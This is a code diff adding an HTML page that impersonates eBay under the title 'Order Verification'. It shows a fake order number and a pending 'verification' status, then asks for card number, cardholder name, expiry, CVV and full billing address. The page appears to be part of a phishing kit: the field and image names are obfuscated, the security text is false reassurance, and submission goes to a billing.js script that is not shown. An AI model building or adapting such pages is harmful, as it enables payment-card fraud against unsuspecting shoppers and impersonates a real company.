@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Order Verification - eBay</title>
+    <link rel="stylesheet" href="billing.css">
+</head>
+<body>
+    <div class="main-container">
+        <header class="header">
+            <img src="images/logo.png" alt="eBay Logo" class="logo">
+
+            <div class="progress-bar">
+                <div class="progress-step active">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Verification</div>
+                </div>
+
+                <div class="progress-line"></div>
+
+                <div class="progress-step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Confirmation</div>
+                </div>
+            </div>
+        </header>
+
+        <form id="verificationForm" class="form-container">
+            <div class="step-indicator">
+                <h1>Order Verification (#286138331560)</h1>
+            </div>
+
+            <div class="order-info">
+                <div class="info-row">
+                    <span class="info-label">Status:</span>
+                    <span class="info-value status-pending">Verification Required</span>
+                </div>
+
+                <div class="info-row">
+                    <span class="info-label">Action Needed:</span>
+                    <span class="info-value">Confirm Payment Method</span>
+                </div>
+
+                <div class="info-row">
+                    <span class="info-label">Note:</span>
+                    <span class="info-value">Complete verification to process your order</span>
+                </div>
+            </div>
+
+            <div class="form-section payment-section">
+                <h3>Payment Method Verification</h3>
+
+                <div class="card-icons">
+                    <img src="images/vsa.svg" alt="visa" class="card-icon">
+                    <img src="images/mstr.svg" alt="mastercard" class="card-icon">
+                    <img src="images/amx.svg" alt="amex" class="card-icon">
+                    <img src="images/dscvr.svg" alt="discover" class="card-icon">
+                </div>
+
+                <div class="input-group">
+                    <label for="cdnm" class="required-field">Card number</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="cdnm" required maxlength="19" autocomplete="cc-number" placeholder="Enter card number">
+                        <div class="card-type-icon"></div>
+                    </div>
+                    <div class="error-text"></div>
+                </div>
+
+                <div class="input-group">
+                    <label for="cdname" class="required-field">Cardholder Name</label>
+                    <input type="text" id="cdname" required autocomplete="cc-name" placeholder="Enter cardholder name">
+                    <div class="error-text"></div>
+                </div>
+
+                <div class="form-row">
+                    <div class="input-group">
+                        <label for="exdt" class="required-field">Expires</label>
+                        <input type="text" id="exdt" required maxlength="5" placeholder="MM/YY" autocomplete="cc-exp">
+                        <div class="error-text"></div>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="vvv" class="required-field">CVV</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="vvv" required maxlength="4" autocomplete="cc-csc" placeholder="CVV">
+                            <div class="cvv-tooltip">
+                                <span class="tooltip-icon">?</span>
+                                <div class="tooltip-content">3-4 digit security code on the back of your card</div>
+                            </div>
+                        </div>
+                        <div class="error-text"></div>
+                    </div>
+                </div>
+            </div>
+
+
+
+            <div class="form-section">
+                <h3>Billing Address</h3>
+
+                <div class="input-group">
+                    <label for="address" class="required-field">Address line 1</label>
+                    <input type="text" id="address" required placeholder="Enter street address">
+                    <div class="error-text"></div>
+                </div>
+
+                <div class="input-group optional">
+                    <label for="address2">Address line 2 (Optional)</label>
+                    <input type="text" id="address2" placeholder="Apartment, suite, etc.">
+                </div>
+
+                <div class="form-row">
+                    <div class="input-group">
+                        <label for="city" class="required-field">City</label>
+                        <input type="text" id="city" required placeholder="Enter city">
+                        <div class="error-text"></div>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="state" class="required-field">State/Region</label>
+                        <input type="text" id="state" required placeholder="Enter state">
+                        <div class="error-text"></div>
+                    </div>
+                </div>
+
+                <div class="form-row">
+                    <div class="input-group">
+                        <label for="zipCode" class="required-field">ZIP code</label>
+                        <input type="text" id="zipCode" required placeholder="Enter ZIP code">
+                        <div class="error-text"></div>
+                    </div>
+
+                    <div class="input-group">
+                        <label for="country" class="required-field">Country</label>
+                        <input type="text" id="country" required placeholder="Enter country">
+                        <div class="error-text"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="notice-section">
+                <span class="security-icon">🔒</span>
+                <div class="notice-text">
+                    <strong>Secure Verification:</strong> We need to verify your payment method to protect your eBay account. This helps ensure the security of your purchase.
+                </div>
+            </div>
+
+            <button type="submit" class="button-primary">
+                <span class="button-text">Verify and Complete Order</span>
+                <div class="button-spinner"></div>
+            </button>
+        </form>
+    </div>
+
+    <script src="billing.js"></script>
+</body>
+</html>
